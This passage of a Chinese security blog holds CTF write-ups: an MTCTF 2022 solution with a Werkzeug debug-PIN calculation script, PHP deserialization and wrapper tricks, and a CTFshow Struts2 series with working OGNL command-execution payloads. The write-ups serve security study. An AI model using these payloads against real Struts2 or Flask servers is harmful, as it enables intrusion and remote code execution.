\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n"},{"title":"MTCTF 2022","url":"/posts/94d6ea88.html","content":"\n## babyjava\n\n直接搜Xpath注入工具\n\nhttps://www.zhihuifly.com/t/topic/370\n\n按照对应的URL与post传参\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202209171837552.png)\n\n按说明一层层爆出结果，最终文档树如下\n\n```\nroot\n\tuser\n\t\tusername（flag在里面）\n```\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202209171843715.png)\n\n```\nflag{273f7d50-2f92-47ba-b5d4-358ae3add895}\n```\n\n## OnlineUnzip\n\n源码\n\n```python\nimport os\nimport re\nfrom hashlib import md5\nfrom flask import Flask, redirect, request, render_template, url_for, make_response\n\napp=Flask(__name__)\n\ndef extractFile(filepath):\n    extractdir=filepath.split('.')[0]\n    if not os.path.exists(extractdir):\n        os.makedirs(extractdir)\n    os.system(f'unzip -o {filepath} -d {extractdir}')\n    return redirect(url_for('display',extractdir=extractdir))\n\n@app.route('/', methods=['GET'])\ndef index():\n    return render_template('index.html')\n\n@app.route('/display', methods=['GET'])\n@app.route('/display/', methods=['GET'])\n@app.route('/display/<path:extractdir>', methods=['GET'])\ndef display(extractdir=''):\n    if re.search(r\"\\.\\.\", extractdir, re.M | re.I) != None:\n        return \"Hacker?\"\n    else:\n        if not os.path.exists(extractdir):\n            return make_response(\"error\", 404)\n        else:\n            if not os.path.isdir(extractdir):\n                f = open(extractdir, 'rb')\n                response = make_response(f.read())\n                response.headers['Content-Type'] = 'application/octet-stream'\n                return response\n            else:\n                fn = os.listdir(extractdir)\n                fn = [\"..\"] + fn\n                f = open(\"templates/template.html\")\n                x = f.read()\n                f.close()\n                ret = \"<h1>文件列表:</h1><br><hr>\"\n                for i in fn:\n                    tpath = os.path.join('/display', extractdir, i)\n                    ret += \"<a href='\" + tpath + \"'>\" + i + \"</a><br>\"\n                x = x.replace(\"HTMLTEXT\", ret)\n                return x\n\n\n@app.route('/upload', methods=['GET', 'POST'])\ndef upload():\n    ip = request.remote_addr\n    uploadpath = 'uploads/' + md5(ip.encode()).hexdigest()[0:4]\n\n    if not os.path.exists(uploadpath):\n        os.makedirs(uploadpath)\n\n    if request.method == 'GET':\n        return redirect('/')\n\n    if request.method == 'POST':\n        try:\n            upFile = request.files['file']\n            print(upFile.filename)\n            if os.path.splitext(upFile.filename)[-1]=='.zip':\n                filepath=f\"{uploadpath}/{md5(upFile.filename.encode()).hexdigest()[0:4]}.zip\"\n                upFile.save(filepath)\n                zipDatas = extractFile(filepath)\n                return zipDatas\n            else:\n                return f\"{upFile.filename} is not a zip file !\"\n        except:\n            return make_response(\"error\", 404)\n\nif __name__ == '__main__':\n    app.run(host='0.0.0.0', port=8000, debug=True)\n```\n\n总结就是会对上传的文件重命名解压，并且在访问文件时通过`../`来执行目录穿越，没关系我们直接用软连接![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202209171847624.png)\n\n可以看到x时一个指向根目录的软连接，压缩，上传，访问，目录穿越可以进行任意的文件读取了\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202209171847477.png)但是这时候我们直接点击flag发现无法读取并且报错，可能没有权限并且debug模式是开启的，那我们可以考虑通过计算PIN值打开console来RCE![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202209171849327.png)\n\n所需的文件如下：\n\n> /sys/class/net/eth0/address\n>\n> /etc/machine-id \n>\n> /proc/sys/kernel/random/boot_id #本题环境存在machine-id所以不需要boot_id了\n>\n> /proc/self/cgroup\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202209171857744.png)\n\n使用脚本来计算PIN值\n\n```python\nimport hashlib\nfrom itertools import chain\nprobably_public_bits = [\n    'ctf'# /etc/passwd\n    'flask.app',# 默认值\n    'Flask',# 默认值\n    '/usr/local/lib/python3.8/site-packages/flask/app.py' # 报错得到\n]\nprivate_bits = [\n    '95532648517',#  /sys/class/net/eth0/address 16进制转10进制\n\t\t'96cec10d3d9307792745ec3b85c896207445bfc71ac17f0f2e5d5488c55c3346ea36da9d417b8f57364ddc5081f3f9b1'#  /etc/machine-id+/proc/self/cgroup\n]\nh = hashlib.sha1()\nfor bit in chain(probably_public_bits, private_bits):\n    if not bit:\n        continue\n    if isinstance(bit, str):\n        bit = bit.encode('utf-8')\n    h.update(bit)\nh.update(b'cookiesalt')\ncookie_name = '__wzd' + h.hexdigest()[:20]\nnum = None\nif num is None:\n    h.update(b'pinsalt')\n    num = ('%09d' % int(h.hexdigest(), 16))[:9]\nrv =None\nif rv is None:\n    for group_size in 5, 4, 3:\n        if len(num) % group_size == 0:\n            rv = '-'.join(num[x:x + group_size].rjust(group_size, '0')\n                          for x in range(0, len(num), group_size))\n            break\n    else:\n        rv = num\nprint(rv)\n```\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202209171853259.png)\n\n直接访问/console RCE\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202209171854614.png)\n\n```\nflag{8fd00724-65fe-4c1c-a13d-83b4fc68c8aa}\n```\n\n\n\n\n\n"},{"title":"PHP Trick","url":"/posts/95491106.html","content":"\n# PHP Trick\n\n## 反序列化\n\n首先肯定要把所有的魔术方法看一看啦\n\n```php\n__construct() \t构造函数\n__destruct()  \t析构函数\n__call()\t\t\t\t在对象中调用一个不可访问方法时，__call() 会被调用\n__callStatic()\t在静态上下文中调用一个不可访问方法时，__callStatic() 会被调用\n__get()\t\t\t\t\t读取不可访问或不存在的属性的值时，__get() 会被调用\n__set()\t\t\t\t\t在给不可访问或不存在的属性赋值时，__set() 会被调用\n__isset()\t\t\t\t当对不可访问或不存在的属性调用 isset() 或 empty() 时，__isset() 会被调用\n__unset()\t\t\t\t当对不可访问或不存在的属性调用 unset() 时，__unset() 会被调用\n__sleep()\t\t\t\t当对一个对象进行序列化操作时，会先调用__sleep()方法再进行序列化操作\n__wakeup() \t\t\t当对一个对象进行反序列化操作时，会先调用__wakeup()方法再进行序列化操作\n__serialize()\t\t和__sleep()方法作用基本相同\n__unserialize() 和__wakeup()方法作用基本相同\n__toString()\t\t__toString()方法用于一个类被当成字符串时应怎样回应，只能返回字符串不然会飙错\n__invoke()\t\t\t当尝试以调用函数的方式调用一个对象时，__invoke() 方法会被自动调用\n__set_state()\t\t当调用 var_export()导出类时，此静态方法会被调用\n__clone()\t\t\t\t对象复制可以通过 clone 关键字来完成（如果可能，这将调用对象的 __clone() 方法）。\n__debugInfo()\t\t当通过 var_dump() 转储对象，获取应该要显示的属性的时候， 该函数就会被调用。如果对象中没有\t定义该方法，那么将会展示所有的公有、受保护和私有的属性。\n```\n\n### __wakeup()\n\n经典的CVE绕过wakeup方法**CVE-2016-7124**\n\n影响范围：\n\nPHP5 < 5.6.25\nPHP7 < 7.0.10\n\n只需要构造出序列化的字符串并将属性数改为大于真实属性数即可\n\n### __destruct()\n\n对于php版本在8.0以下的，只要让程序运行过程中抛出异常，就不会执行`__destruct()`方法，但是`die`方法实惠正常进行垃圾回收并触发`__destruct()`方法的\n\n### \\__call()（__callStatic()）\n\n先来看以下call的官方说明格式\n\n```php\nfunction __call(string $function_name, array $arguments)\n{\n    // 方法体\n}\n```\n\n也就是说你传一个参数也好多个参数也罢，这些内容都会被以数组的形式存储起来，所以在`__call()`方法中调用参数内容时一定一定要按照array的形式调用\n\n### 原生类\n\n有时候反序列化会碰到没有给出足够使用的类的时候，这时我们可以利用一把PHP自带的原生类进行构造（以下内容都在PHP7环境中进行测试）\n\n**Exception**\n\n```php\n<?php\n\t\t$a=new Exception(\"1\");\n\t\techo $a;\n\t\t//Exception: 1 in /Users/jlan/PhpstormProjects/untitled/index.php:2 Stack trace: #0 {main}\n?>\n```\n\n我们发现传出的内容为：`Exception: 传入的字符串`如果此时正好有`eval`包裹了该类变量我们就能通过传入`xx;恶意代码;/*`达到任意命令执行的效果\n\n**FilesystemIterator**\n\n```php\n<?php\n  \t$a=new FilesystemIterator(\"./\");\n  \techo $a;\n  \t//index.php\n?>\n```\n\n传入目录返回一个迭代器，`toString`返回迭代器的第一项，可使用glob协议进行通配\n\n**DirectoryIterator**\n\n```php\n<?php\n  \t$a=new DirectoryIterator(\"./\");\n  \techo $a;\n  \t//index.php\n?>\n```\n\n同上\n\n**GlobIterator**\n\n```\n<?php\n$a=new GlobIterator(\"./f*\");\necho $a;\n//flag.txt\n?>\n```\n\nGlobIterator和上方这两个类差不多，不过glob是GlobIterator类本身自带的，因此在遍历的时候，就不需要带上glob协议头了，只需要后面的相关内容\n\n**SplFileObject**\n\n```php\n<?php\n    $a=new SplFileObject(\"./flag.txt\");\n    echo $a;\n\t\t//读取文件首行内容\n?>\n```\n\nSplFileObject这个类返回的也是一个迭代器，但是可以用伪协议啊\n\n**SplFileInfo**\n\n```php\n<?php\n    $a=new SplFileInfo(\"phpinfo();\");\n    echo $a;\n    //phpinfo();\n    eval($a);\n?>\n```\n\n原封不动返回传入内容\n\n**Error**\n\n和**Exception**完全一致\n\n## URL解析\n\n## 文件包含\n\n很重要的一定是各种伪协议了\n\n```\nfile://\t直接读取文件，不受allow_url_fopen和allow_url_include影响\ndata://[<MIME-type>][;cherset=<encoding>][;base64],<data>\t可以直接往里面放内容\nzip://[压缩包绝对路径]#[压缩包内文件]\t可以直接读取压缩包中的文件\nphp://input\t直接读取请求体的所有内容\nphp://output\t纯写入个人感觉还没啥大用\nphp://fd\t\t包含文件描述符指向的文件\nphp://memory\t读写内存的临时文件，没感觉有啥利用方法（\nphp://temp\t\t上面的升级版，在临时文件>2MB时就会从内存中拉出来变成在默认sys_get_temp_dir目录下的文件\nphp://filter\t文件读取过滤器\nphar://\t就是phar啊你还想要什么（其实也可以和zip一样读取压缩包内容）\n```\n\n### php://filter\n\n最能玩出花来的一个协议，最基础的当然是base64读取了\n\n```\nphp://filter/convert.base64-encode/resource=xxx.php\n```\n\n中间convert可用的内容有\n\n```\nconvert.quoted-printable-encode\t将文本中的不可见字符转换为可打印的字符进行输出\nconvert.quoted-printable-decode 上述逆过程\n```\n\n说实话还没怎么见过这个用法，~~倒也确实没啥卵用~~\n\n其中可用的最多的就是这个\n\n```\nconvert.iconv.<input-encoding>.<output-encoding>\n```\n\n这个转换器可以将内容从任意一个编码转换为另一种编码，https://gist.github.com/loknop/b27422d355ea1fd0d90d6dbc1e278d4d\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n## 文件上传\n\n"},{"title":"CTFshowJava","url":"/posts/efe011ec.html","content":"\n# CTFshow Java\n\n全部题都是struts2[框架](https://so.csdn.net/so/search?q=框架&spm=1001.2101.3001.7020)漏洞\n\nStruts2是用Java语言编写的一个基于[MVC](https://so.csdn.net/so/search?q=MVC&spm=1001.2101.3001.7020)设计模式的Web应用框架\n\n注意以下所有漏洞都可以直接利用公开的脚本进行一键利用\n\n首先要了解一下OGNL中的特殊符号作用\n\n> - `%`的用途是在标志的属性为字符串类型时，计算OGNL表达式%{}中的值\n> - `#`的用途访主要是访问非根对象属性，因为Struts 2中值栈被视为根对象，所以访问其他非根对象时，需要加#前缀才可以调用\n> - `$`主要是在Struts 2配置文件中，引用OGNL表达式\n\n关于OGNL语言的介绍可以看[这里](https://jueee.github.io/2020/08/2020-08-15-Ognl表达式的基本使用方法/)，在这里可以进行利用是因为struts将其作为默认语言\n\n判断页面是否基于Struts2：\n\n- 通过页面回显的错误消息来判断，页面不回显错误消息时则无效\n- 通过网页后缀来判断，如.do .action，有可能不准\n  - 如果配置文件中常数extension的值以逗号结尾或者有空值，指明了action可以不带后缀，那么不带后缀的uri也可能是struts2框架搭建的\n  - 如果使用Struts2的rest插件，其默认的struts-plugin.xml指定的请求后缀为xhtml,xml和json\n- 判断 /struts/webconsole.html 是否存在来进行判断，需要 devMode 为 true\n\n[脚本链接](https://github.com/HatBoy/Struts2-Scan)\n\n## ValueStack\n\n后面会高频出现的一个东西，先来了解一下\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n首先Struts2的运行流程是（后面的很多东西都是基于这个流程分析的）\n\n![流程图](https://taomujian.github.io/img/S2-008/images/%E6%B5%81%E7%A8%8B%E5%9B%BE.png)\n\n1. HTTP请求经过一系列的标准过滤器(Filter)组件链(这些拦截器可以是Struts2 自带的,也可以是用户自定义的,本环境中struts.xml中的package继承自struts-default,struts-default就使用了Struts2自带的拦截器.ActionContextCleanUp主要是清理当前线程的ActionContext、Dispatcher,FilterDispatcher主要是通过ActionMapper来决定需要调用那个Action,FilterDispatcher是控制器的核心,也是MVC中控制层的核心组件),最后到达FilterDispatcher过滤器.\n\n2. 核心控制器组件FilterDispatcher根据ActionMapper中的设置确定是否需要调用某个Action组件来处理这个HttpServletRequest请求,如果ActionMapper决定调用某个Action组件,FilterDispatcher核心控制器组件就会把请求的处理权委托给ActionProxy组件.\n\n3. ActionProxy组件通过Configuration Manager组件获取Struts2框架的配置文件struts.xml,最后找到需要调用的目标Action组件类,然后ActionProxy组件就创建出一个实现了命令模式的ActionInvocation类的对象实例类的对象实例(这个过程包括调用Anction组件本身之前调用多个的拦截器组件的before()方法)同时ActionInvocation组件通过代理模式调用目标Action组件.但是在调用之前ActionInvocation组件会根据配置文件中的设置项目加载与目标Action组件相关的所有拦截器组件(Interceptor)\n\n4. 一旦Action组件执行完毕,ActionInvocation组件将根据开发人员在Struts2.xml配置文件中定义的各个配置项目获得对象的返回结果,这个返回结果是这个Action组件的结果码(比如SUCCESS、INPUT),然后根据返回的该结果调用目标JSP页面以实现显示输出.\n\n5. 最后各个拦截器组件会被再次执行(但是顺序和开始时相反,并调用after()方法),然后请求最终被返回给系统的部署文件中配置的其他过滤器,如果已经设置了ActionContextCleanUp过滤器,那么FilterDispatcher就不会清理在ThreadLocal对象中保存的ActionContext信息.如果没有设置ActionContextCleanUp过滤器,FilterDispatcher就会清除掉所有的ThreadLocal对象.\n\n## 279\n\n漏洞：S2-001\n\n漏洞成因：当用户提交表单数据且验证失败时，服务器使用OGNL表达式解析用户先前提交的参数值，%{value}并重新填充相应的表单数据\n\n影响版本：WebWork 2.1 (with altSyntax enabled), WebWork 2.2.0 - WebWork 2.2.5, Struts 2.0.0 - Struts 2.0.8\n\n漏洞分析：\n\n1. 首先断点打在接受参数并验证的地方，进而跟进触发点![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202209100121467.png)![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202209100124296.png)\n\n2. 由于验证失败导致返回error进行渲染，查看对`<s:textfield>`标签的渲染规则\n\n   > jsp文件中遇到Struts2标签 <s:textfield 时程序会先调用 doStartTag,并将标签中的属性设置到TextFieldTag对象相应属性中.在遇到 /> 结束标签的时候调用doEndTag方法\n\n   ![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202209100126720.png)\n\n3. 直接在渲染函数处打断点，在`org.apache.struts2.views.jsp.ComponentTagSupport`中找到上述提到的两个函数![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202209100129583.png)\n\n4. 跟进end方法，继续跟进evaluateParams方法，可以看到在这个方法中如果开启了altSyntax，那么就会在name属性的字段两边添加OGNL表达式字符生成expr属性，步过执行发现expr内容确实被改变![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202209100134657.png)\n\n5. 继续跟进findValue方法，在这里就能看到出问题的点了，就是translateVariables方法![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202209100141364.png)\n\n6. 步入后发现其又调用了同名重载方法，直接看重载后的函数内容![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202209100144830.png)\n\n   > 第一次获取o的值,这里的stack为OgnlValueStack,它是ValueStack的实现类.ValueStack是Struts2的一个接口,表面意义为值栈,类似于一个数据中转站,Struts2的数据都会保存在ValueStack中.Struts2在发起请求创建Action实例的同时会创建一个OgnlValueStack值栈实例.Struts2使用OGNL将请求Action的参数封装为对象存储到值栈中,并通过OGNL表达式读取值栈中的对象属性值.\n   >\n   > ValueStack中有两个主要区域:\n   >\n   > ​\tCompoundRoot区域:是一个ArrayList,存储了Action实例,它作为OgnlContext的Root对象.获取root数据不需要加#\n   >\n   > ​\tcontext区域:即OgnlContext上下文,是一个Map,放置web开发常用的对象数据的引用.request、session、parameters、application等.获取context数据需要加#\n   >\n   > 操作值栈,通常指的是操作ValueStack中的root区域.\n   >\n   > OgnlValueStack的findValue方法可以在CompoundRoot中从栈顶向栈底找查找对象的属性值\n\n   以上为大佬解析的stack变量的内容，不管如何，我们直接跟进到55行的stack的findValue方法中，可以看到传入的参数内容![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202209100206870.png)继续步入到`OgnlUtil.getValue`方法中，继续步入到`Ognl.getValue`方法中，可以看到其对name参数进行了compile操作并返回传入的getValue方法，将username中的内容取出并执行其中的OGNL表达式![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202209100215156.png)如此反复可以看到最后OGNL表达式被成功执行并且结果存入了result中![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202209100215768.png)\n\npayload：\n\n```java\n// 获取tomcat路径\n%{\"tomcatBinDir{\"+@java.lang.System@getProperty(\"user.dir\")+\"}\"}\n\n// 获取web路径\n%{#req=@org.apache.struts2.ServletActionContext@getRequest(),#response=#context.get(\"com.opensymphony.xwork2.dispatcher.HttpServletResponse\").getWriter(),#response.println(#req.getRealPath('/')),#response.flush(),#response.close()}\n\n// 命令执行 env，flag就在其中\n%{#a=(new java.lang.ProcessBuilder(new java.lang.String[]{\"env\"})).redirectErrorStream(true).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#f=#context.get(\"com.opensymphony.xwork2.dispatcher.HttpServletResponse\"),#f.getWriter().println(new java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()}\n```\n\n## 280\n\n漏洞：S2-003 S2-005 *CVE-2008-6504*\n\n漏洞成因：\n\n- S2-003成因是Struts2将HTTP的每个参数名解析为ognl语句执行，而ognl表达式是通过#来访问struts的对象，Struts2框架虽然过滤了#来进行过滤，但是可以通过unicode编码（u0023）或8进制（43）绕过了安全限制，达到代码执行的效果\n- S2-005的原理和S2-003基本相似，导致用户可以绕过官方的安全配置（禁止静态方法调用和类方法执行），再次造成的漏洞，可以说是升级版的S2-005是升级版的S2-003\n\n影响范围：Struts 2.0.0 - Struts 2.1.8.1\n\n漏洞分析：\n\n1. 首先触发点`com.opensymphony.xwork2.interceptor.ParametersInterceptor`，可以看到默认的`denyMethodExecution`值是true，改为false才能继续执行，所以payload中部分内容是要将其改为false的![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202209111446997.png)\n2. 查看执行payload后其中获取的参数![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202209111447204.png)\n3. 步入setParameters函数，函数通过迭代器将参数逐个取出![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202209111450215.png)\n4. 步入acceptableName函数，继续步入isAccepted函数![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202209111455764.png)\n5. 可以看到此处的正则表达式只是简单的对#进行了过滤并没有过滤unicode字符，最终执行结束返回字符串使得判定为真![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202209111501736.png)![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202209111459231.png)\n6. 下一步继续跟进stack的setValue方法![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202209111556550.png)\n7. 发现其又调用了同名的重载方法，继续跟进`OgnlUtil.setValue`![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202209111605549.png)\n8. 跟入compile方法，继续跟入parseExpression方法，继续跟入topLevelExpression方法，继续进入expression，经过一系列操作后最终解析到`ognl.JavaCharStream#readChar`对字符串进行操作![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202209111607140.png)![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202209111610477.png)\n9. 可以看到其对\\u类型的字符进行了专门的解析，将其转化为正常字符，导致OGNL表达式执行![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202209111615029.png)\n\n## 281\n\n漏洞：S2-007 *CVE-2012-0838*\n\n漏洞成因：在Struts2中,可以将HTTP请求数据注入到实际业务Action的属性中,这些属性可以是任意类型的数据,通过HTTP只能获取到String类型数据,Struts2中默认有一个类型转换器,可以完成大部分的自动转换操作,可以通过xml文件,来定义转换规则.比如Action类中有一个integer属性,不需要执行任何操作,Struts会自动将请求参数转换为integer属性.当配置了Validation时,若类型转换出错,后端默认会将用户提交的表单值通过字符串拼接,然后执行一次OGNL表达式解析并返回,从而可以构造特殊的恶意请求来执行命令.这种利用方式和S2-001的很相似,不同的是利用点不同.\n\n影响版本：Struts 2.0.0 - Struts 2.2.3\n\n漏洞分析：\n\n1. 首先看demo中对Struts2的默认类型转换器的调用，其通过xml文件来定义转换规则，在环境给予的demo中就将age转换为int类型，范围在1-100![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202209141518983.png)\n2. 具体漏洞触发点就在`com.opensymphony.xwork2.interceptor.ConversionErrorInterceptor`中，先在对应位置打好断点，然后发起请求，将payload放入![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202209141522934.png)\n3. 可以看到此处的代码将转换出问题的内容放入了`conversionErrors`变量中，并在i$迭代器中循环将属性名赋值给propertyName，属性值赋值给value![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202209141530747.png)![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202209141534846.png)\n4. 最后对fakie进行的put操作，我们跟进`getOverrideExpr`方法，可以看到对value进行处理时对字符串前后分别添加了一个单引号，这也是我们的payload是这种格式的原因，![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202209141539863.png)\n5. 最终走入OgnlValueStack的setExprOverrides方法，将fakie赋值给overrides属性![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202209141547096.png)![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202209141545456.png)\n6. 当拦截器执行结束后会将jsp内容进行解析，会从OgnlValueStack的overrides属性中寻找key为age的键值对并执行ognl表达式\n\npayload:\n\n```\n' + (#_memberAccess[\"allowStaticMethodAccess\"]=true,#foo=new java.lang.Boolean(\"false\") ,#context[\"xwork.MethodAccessor.denyMethodExecution\"]=#foo,@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec('id').getInputStream())) + '\n```\n\n## 282\n\n漏洞：S2-008 *CVE-2012-0391*\n\n漏洞成因：Struts2框架存在一个devmode模式,当devmode模式开启时,Struts2对传入的参数没有严格限制,导致多个地方可以执行恶意代码\n\n影响版本：Struts 2.0.0 - Struts 2.3.17\n\n漏洞分析：\n\n1. 首先看出发点位置在`org.apache.struts2.interceptor.debugging.DebuggingInterceptor`，在第95行处打断点，获取到debug的值为command，进入else if的判断，查看内容![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202209100057285.png)\n2. 可以看到进入了else if的判断后将expression传入参数的值在138行交给了cmd，又在145行通过`stack.findValue`执行了OGNL表达式并将回显内容写入页面![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202209100101557.png)\n\n漏洞修复：在之后的版本中使用正则表达式来防止内容执行\n\nPayload：\n\n```\n?debug=command&expression=%28%23_memberAccess%5B\"allowStaticMethodAccess\"%5D%3Dtrue%2C%23foo%3Dnew%20java.lang.Boolean%28\"false\"%29%20%2C%23context%5B\"xwork.MethodAccessor.denyMethodExecution\"%5D%3D%23foo%2C@org.apache.commons.io.IOUtils@toString%28@java.lang.Runtime@getRuntime%28%29.exec%28%27whoami%27%29.getInputStream%28%29%29%29\n```\n\n## 283\n\n漏洞：S2-009 *CVE-2011-3923*\n\n漏洞成因：Struts2框架中ParametersInterceptor拦截器只检查传入的参数名是否合法,不会检查参数值，例如传入参数`top['foo'](0)`会通过ParametersInterceptor的白名单检查,OGNL会将其解析为(top[‘foo’])(0),并将foo的值也作为OGNL表达式进行计算从而造成代码执行\n\n其实这个漏洞是对S2-003和S2-005漏洞的绕过.S2-003的修复方法是禁止#号，于是S2-005通过使用#号的unicode编码\\u0023或8进制编码\\43来绕过，Struts2对S2-005的修复方法是禁止\\等特殊符号，这次是通过Struts2框架中ParametersInterceptor拦截器只检查传入的参数名而不检查参数值的方式进行构造OGNL表达式从而造成代码执行\n\n影响版本：Struts 2.0.0 - Struts 2.3.1\n\n漏洞分析：\n\n1. 流程与S2-005基本相同，跳过分析，直接分析payload\n2. 当有形似(one)(two)的变量时，one会被当作一个OGNL表达式去计算，然后把它的结果当作另一个以two为根对象的OGNL表达式再一次计算，所以，如果one有返回内容，那么这些内容将会被当作OGNL语句被计算，而payload结尾传入的`z[(name)(%27meh%27)]`就是为了把name参数的值当作OGNL表达式计算\n\npayload：\n\n```java\n?age=12313&name=(%23context[%22xwork.MethodAccessor.denyMethodExecution%22]=+new+java.lang.Boolean(false),+%23_memberAccess[%22allowStaticMethodAccess%22]=true,+%23a=@java.lang.Runtime@getRuntime().exec(%27whoami%27).getInputStream(),%23b=new+java.io.InputStreamReader(%23a),%23c=new+java.io.BufferedReader(%23b),%23d=new+char[51020],%23c.read(%23d),%23kxlzx=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),%23kxlzx.println(%23d),%23kxlzx.close())(meh)&z[(name)(%27meh%27)] \n```\n\n## 284\n\n漏洞：S2-012 *CVE-2013-1965*\n\n漏洞成因：在Struts2框架中，如果配置Action中的Result时使用了重定向类型，并且还使用${param_name}作为重定向变量，当触发redirect类型返回时，Struts2使用${param_name}获取其值，在这个过程中会对name参数的值执行OGNL表达式解析,从而可以插入任意OGNL表达式导致任意代码执行\n\n影响版本：Struts 2.0.0 - Struts 2.3.14.2\n\n漏洞分析：\n\n1. 首先还是查看配置文件，可以看到其中使用了redirect方法并且返回值中使用了${name}取值，存在漏洞触发条件![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202209142228174.png)\n\n2. 在`com.opensymphony.xwork2.DefaultActionInvocation`类中打断点![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202209142230130.png)\n\n3. 步入方法，createResult方法会根据action的返回值获取对应的result标签配置，然后传入到buildResult方法中，这个方法的作用是生成对应的Result实现类，也就是`org.apache.struts2.dispatcher.ServletRedirectResult`类，并把对应 result标签的值/index.jsp?name=${name}设置给ServletRedirectResult 类的location属性，然后返回ServletRedirectResult![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202209142322880.png)![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202209142322785.png)\n\n4. 然后返回到executeResult方法中继续执行，进入到`this.result.execute`中，查看result就是ServletRedirectResult类型，步入发现其执行了super的execute方法，继续跟入conditionalParse方法，发现其执行了S2-001中同名关键方法translateVariables，并且通过重载能看到限制了循环次数最高为1，这就是对S2-001的漏洞修复![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202209142328950.png)![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202209142334539.png)\n\n5. > 对于S2-001漏洞,官方设置了循环次数,从而限制恶意代码,但这个设置的循环次数是针对的while循环,在外面还有一个for循环,for循环开始的pos参数用来获取expression表达式的开始位置,比如解析完了%{password}的值,下一次解析是从%{password}后面开始.在S2-001的修复中它被放在了for循环里,导致第二次for循环时pos的值会被重置为0.从而又从头开始解析.从下图中的变量值可以看到for进行了2次循环,循环2次是因为传入的参数new char[]{‘$’, ‘%’}长度为2导致的.for第二次循环时open为arr数组的第二个参数%,这个%和{组合后又成了S2-001的利用所需要的条件,最后还是通过while循环中的stack.findValue来进行执行代码的.S2-001修复方案中的增加loopCount变量限制了while循环的次数,却没有限制for循环的次数,每次for循环开始时loopCount都会被重置为1.\n\n   ![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202209142337790.png)\n\npayload：\n\n```\n%{#a=(new java.lang.ProcessBuilder(new java.lang.String[]{\"whoami\"})).redirectErrorStream(true).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#f=#context.get(\"com.opensymphony.xwork2.dispatcher.HttpServletResponse\"),#f.getWriter().println(new java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()}\n```\n\n## 285\n\n漏洞：S2-013 *CVE-2013-1966*\n\n漏洞成因：在Struts2标签中和都包含一个includeParams属性，其值可设置为none、get 或 all，其对应意义分别为：none:链接不包含请求的任意参数值(默认)，get:链接只包含GET请求中的参数和其值，all:链接包含GET和POST所有参数和其值，用来显示一个超链接,当includeParams=all的时候，会将本次请求的GET和POST参数都放在URL的GET参数上，这个参数会进行OGNL表达式解析，从而可以插入任意OGNL表达式导致任意代码执行\n\n影响版本：*Struts 2.0.0 - Struts 2.3.14.1*\n\n漏洞分析：\n\n1. 看配置文件，includeParams属性为all![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202209150147876.png)\n2. `org.apache.struts2.components.ComponentUrlProvider`打断点![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202209150209394.png)\n3. 跟入beforeRenderUrl函数，这个函数获取了url所传递的参数可以看到includeParams参数为all，此处的mergeRequestParameters获取到了url中传递的参数![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202209151820358.png)![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202209161613470.png)\n4. 步过执行直到end函数，继续步入renderUrl函数，此时我们能看到我们的payload已经被放入到了urlComponent的paramters属性中，继续跟入determineActionURL函数![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202209161706306.png)![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202209161709860.png)\n5. 